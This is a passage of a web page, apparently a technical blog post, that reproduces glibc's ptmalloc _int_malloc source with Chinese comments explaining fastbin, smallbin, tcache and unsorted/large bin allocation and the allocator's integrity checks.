class="comment">     that are so large that they wrap around zero when padded and</span></span><br><span class="line"><span class="comment">     aligned.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  checked_request2size (bytes, nb);<span class="comment">//checked_request2size()函数将需要分配的内存大小bytes转换为需要分配的chunk大小nb，Ptmalloc内部分配都是以chunk为单位，根据chunk的大小，决定如何获得满足条件的chunk。，比如说需要对齐、还有控制最小大小</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span></span><br><span class="line"><span class="comment">     mmap.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (av == <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">	alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">------------------------------------检查arena，如果没有可用的arena或者arena的内存不足，那么就通过系统调用mmap去申请一块内存，并返回。</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If the size qualifies as a fastbin, first check corresponding bin.</span></span><br><span class="line"><span class="comment">     This code is safe to execute even if av is not yet initialized, so we</span></span><br><span class="line"><span class="comment">     can try it without checking, which saves some time on this fast path.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REMOVE_FB(fb, victim, pp)			\</span></span><br><span class="line">  <span class="keyword">do</span>							\</span><br><span class="line">    &#123;							\</span><br><span class="line">      victim = pp;					\</span><br><span class="line">      <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)				\</span><br><span class="line">	<span class="keyword">break</span>;						\</span><br><span class="line">    &#125;							\</span><br><span class="line">  <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) \</span><br><span class="line">	 != victim);					\</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))<span class="comment">//判断malloc大小是否属于fastbin范围内</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);<span class="comment">//取到fastbin的起始头索引号</span></span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);<span class="comment">//取到堆块，去fastbin这个空闲链表中取</span></span><br><span class="line">      mchunkptr pp;</span><br><span class="line">      victim = *fb;<span class="comment">//将堆块赋值给victim</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="literal">NULL</span>)<span class="comment">//对上一步得到的堆块做一系列检查，函数无返回</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">	    *fb = victim-&gt;fd;</span><br><span class="line">	  <span class="keyword">else</span></span><br><span class="line">	    REMOVE_FB (fb, pp, victim);</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_likely (victim != <span class="literal">NULL</span>))</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">	      <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">		malloc_printerr (<span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>);</span><br><span class="line">	      check_remalloced_chunk (av, victim, nb);<span class="comment">//检测freechunk的size最低位为1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">	      <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">		 stash them in the tcache.当我们在这里的时候，如果我们看到其他同样大小的块，把他们藏在 tcache 中。*/</span></span><br><span class="line">	      <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">	      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">		&#123;</span><br><span class="line">		  mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">		  <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">		  <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">			 &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">			*fb = tc_victim-&gt;fd;</span><br><span class="line">		      <span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">			  REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">			  <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">			    <span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		      tcache_put (tc_victim, tc_idx);<span class="comment">//如果tachebin没满，把fastbin中的堆块循环放入tcachebin中</span></span><br><span class="line">		    &#125;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	      <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">	      alloc_perturb (p, bytes);</span><br><span class="line">	      <span class="keyword">return</span> p;<span class="comment">//最后将最早的fastbin的第一个节点返回给用户</span></span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If a small request, check regular bin.  Since these &quot;smallbins&quot;</span></span><br><span class="line"><span class="comment">     hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">     (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">     processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">     anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (in_smallbin_range (nb))<span class="comment">//如果申请的chunk大小在smallbin的范围内</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);<span class="comment">//取到smallbin的链头</span></span><br><span class="line">      bin = bin_at (av, idx);<span class="comment">//smallbin尾部</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)<span class="comment">//判断当前的bin链是否为空</span></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">          last宏：因为smallbin是双向链表结构，采取FIFO（先进先出）存取chunk，所以使用last返回双向链表中的最先free进去的节点。if中判断如果双链表中的最后一个不是头，那么说明链表不为空</span></span><br><span class="line"><span class="comment">          简而言之就是取索引对应的smallbin中最后一个chunk</span></span><br><span class="line"><span class="comment">          */</span></span><br><span class="line">          </span><br><span class="line">          </span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;<span class="comment">//获取倒数第二个chunk</span></span><br><span class="line">          </span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<span class="comment">//取走之前进行系统检测，检查双向链表完整性</span></span><br><span class="line">	    malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);<span class="comment">//如果当前chunk被malloc使用后，那么当前chunk的后面两个chunk的previnuse都设置为1.</span></span><br><span class="line">          </span><br><span class="line">          bin-&gt;bk = bck;<span class="comment">//将victim从smallbin的链表中卸下</span></span><br><span class="line">          bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">	    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">	  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">	     stash them in the tcache.  */</span></span><br><span class="line">	  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);<span class="comment">//获取对应size的tcache索引</span></span><br><span class="line">	  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">	    &#123;</span><br><span class="line">	      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">	      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">		     &amp;&amp; (tc_victim = last (bin)) != bin)<span class="comment">//当tcachebin不为空，且没满，smallbin不为空，则依次取最后一个chunk插入到tcachebin里</span></span><br><span class="line">		&#123;</span><br><span class="line">		  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      bck = tc_victim-&gt;bk;</span><br><span class="line">		      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">		      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">			set_non_main_arena (tc_victim);</span><br><span class="line">		      bin-&gt;bk = bck;<span class="comment">//将当前chunk从smallbin里卸下</span></span><br><span class="line">		      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">		      tcache_put (tc_victim, tc_idx);<span class="comment">//放进tcachebin中</span></span><br><span class="line">	            &#125;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//和fastbin相同，如果tcachebin不满则把smallbin中的chunk放入tcachebin中，然后返回smallbin的第一个节点。</span></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If this is a large request, consolidate fastbins before continuing.</span></span><br><span class="line"><span class="comment">     While it might look excessive to kill all fastbins before</span></span><br><span class="line"><span class="comment">     even seeing if there is space available, this avoids</span></span><br><span class="line"><span class="comment">     fragmentation problems normally associated with fastbins.</span></span><br><span class="line"><span class="comment">     Also, in practice, programs tend to have runs of either small or</span></span><br><span class="line"><span class="comment">     large requests, but less often mixtures, so consolidation is not</span></span><br><span class="line"><span class="comment">     invoked all that often in most programs. And the programs that</span></span><br><span class="line"><span class="comment">     it is called frequently in otherwise tend to fragment.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"><span class="comment">//如果申请的chunk大小既不是tcache、fastbin、smallbin，此时执行malloc_consolidate()----作用是进行碎片整理，但是没有对freechunk切割使用</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    何为consolidate</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    我们知道大于0x80的chunk被释放之后就放到了unsortedbin上面去，但是unsortedbin是一个未分类的bin，上面的chunk也处于未分类的状态。但是这些chunk需要在特定的条件下被整理然后放入到smallbins或者largebins中。</span></span><br><span class="line"><span class="comment">    这个整理的过程被称为unsortedbin的“consolidate”，但是“consolidate”是要在特定的条件下才会发生的，并且与malloc紧密相关。</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    其触发情景：</span></span><br><span class="line"><span class="comment">    一：当我们malloc一个chunk，这个chunk的大小大于smallbin的范围，在unsortedbin中寻找可用的freechunk使用时，会触发malloc_conlolidate</span></span><br><span class="line"><span class="comment">    二：发现unsortedbin中有大的freechunk可以切割给malloc使用时，切割unsortedbin，产生last remainder的时候会consolidate，见文章：https://blog.csdn.net/qq_41453285/article/details/97803141（此种情况不同于情景一，不需要考虑malloc的大小）。</span></span><br><span class="line"><span class="comment">    三malloc时如果bin链中没有可以使用的freechunk，并且去切割topchunk，发现topchunk也不够用，此时回去再去调用malloc_consolidate进行一次整理。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = largebin_index (nb);</span><br><span class="line">      <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))<span class="comment">//判断fastbin中是否有空闲块，有则调用malloc_consolidate（）将其合并放入到unsortedbin中</span></span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Process recently freed or remaindered chunks, taking one only if</span></span><br><span class="line"><span class="comment">     it is exact fit, or, if this a small request, the chunk is remainder from</span></span><br><span class="line"><span class="comment">     the most recent non-exact fit.  Place other traversed chunks in</span></span><br><span class="line"><span class="comment">     bins.  Note that this step is the only place in any routine where</span></span><br><span class="line"><span class="comment">     chunks are placed in bins.</span></span><br><span class="line"><span class="comment">     The outer loop here is needed because we might not realize until</span></span><br><span class="line"><span class="comment">     near the end of malloc that we should have consolidated, so must</span></span><br><span class="line"><span class="comment">     do so and retry. This happens at most once, and only when we would</span></span><br><span class="line"><span class="comment">     otherwise need to expand memory to service a &quot;small&quot; request.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  INTERNAL_SIZE_T tcache_nb = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    tcache_nb = nb;</span><br><span class="line">  <span class="keyword">int</span> return_cached = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  tcache_unsorted_count = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (;; )<span class="comment">//for大循环</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line">          mchunkptr next = chunk_at_offset (victim, size);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (size &lt;= <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">              || __glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): invalid size (unsorted)&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">              || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): invalid next size (unsorted)&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)</span><br><span class="line">              || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): unsorted double linked list corrupted&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (prev_inuse (next)))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">             only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">             runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">             exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">             no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line">---------------下面是重新申请smallchunk的过程</span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              remainder = chunk_at_offset (victim, nb);</span><br><span class="line">              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">              av-&gt;last_remainder = remainder;</span><br><span class="line">              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">              <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                &#123;</span><br><span class="line">                  remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                  remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">              set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">              set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>); </span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (size == nb)</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">		set_non_main_arena (victim);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">	      <span class="comment">/* Fill cache first, return to user only if cache fills.</span></span><br><span class="line"><span class="comment">		 We may return one of these chunks later.  */</span></span><br><span class="line">	      <span class="keyword">if</span> (tcache_nb</span><br><span class="line">		  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">		&#123;</span><br><span class="line">		  tcache_put (victim, tc_idx);</span><br><span class="line">		  return_cached = <span class="number">1</span>;</span><br><span class="line">		  <span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	      <span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">                  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size)</span><br><span class="line">		      &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      assert (chunk_main_arena (fwd));</span><br><span class="line">                      <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">			  assert (chunk_main_arena (fwd));</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size</span><br><span class="line">			  == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (fwd))</span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          mark_bin (av, victim_index);</span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* If we&#x27;ve processed as many chunks as we&#x27;re allowed while</span></span><br><span class="line"><span class="comment">	 filling the cache, return one of the cached ones.  */</span></span><br><span class="line">      ++tcache_unsorted_count;</span><br><span class="line">      <span class="keyword">if</span> (return_cached</span><br><span class="line">	  &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="number">0</span></span><br><span class="line">	  &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line">          <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* If all the small chunks we found ended up cached, return one now.  */</span></span><br><span class="line">      <span class="keyword">if</span> (return_cached)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         If a large request, scan through the chunks of current bin in</span></span><br><span class="line"><span class="comment">         sorted order to find smallest that fits.  Use the skip list for this.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">      经过前面一系列的执行，如果fastbins、smallbins、unsortedbin中的chunk都不符合malloc的要求，接下来就是判断malloc的chunk是否为largebin，并在largebins中找chunk来使用了。</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">        &#123;</span><br><span class="line">          bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">          <span class="keyword">if</span> ((victim = first (bin)) != bin</span><br><span class="line">	      &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (victim)</span><br><span class="line">	        &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb))</span><br><span class="line">            &#123;</span><br><span class="line">              victim = victim-&gt;bk_nextsize;</span><br><span class="line">              <span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                      (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb)))</span><br><span class="line">                victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">                 list does not have to be rerouted.  */</span></span><br><span class="line">              <span class="keyword">if</span> (victim != last (bin)</span><br><span class="line">		  &amp;&amp; chunksize_nomask (victim)</span><br><span class="line">		    == chunksize_nomask (victim-&gt;fd))</span><br><span class="line">                victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Exhaust */</span></span><br><span class="line">              <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">                &#123;</span><br><span class="line">                  set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">		    set_non_main_arena (victim);</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="comment">/* Split */</span></span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  remainder = chunk_at_offset (victim, nb);</span><br><span class="line">                  <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                     have to perform a complete insert here.  */</span></span><br><span class="line">                  bck = unsorted_chunks (av);</span><br><span class="line">                  fwd = bck-&gt;fd;</span><br><span class="line">		  <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">		    malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>);</span><br><span class="line">                  remainder-&gt;bk = bck;</span><br><span class="line">                  remainder-&gt;fd = fwd;</span><br><span class="line">                  bck-&gt;fd = remainder;</span><br><span class="line">                  fwd-&gt;bk = remainder;</span><br><span class="line">                  <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                      remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                  set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">                  set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                  set_foot (remainder, remainder_size);</span><br><span class="line">                &#125;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         Search for a chunk by scanning bins, starting with next largest</span></span><br><span class="line"><span class="comment">         bin. This search is strictly by best-fit; i.e., the smallest</span></span><br><span class="line"><span class="comment">         (with ties going to approximately the least recently used) chunk</span></span><br><span class="line"><span class="comment">         that fits is selected.</span></span><br><span 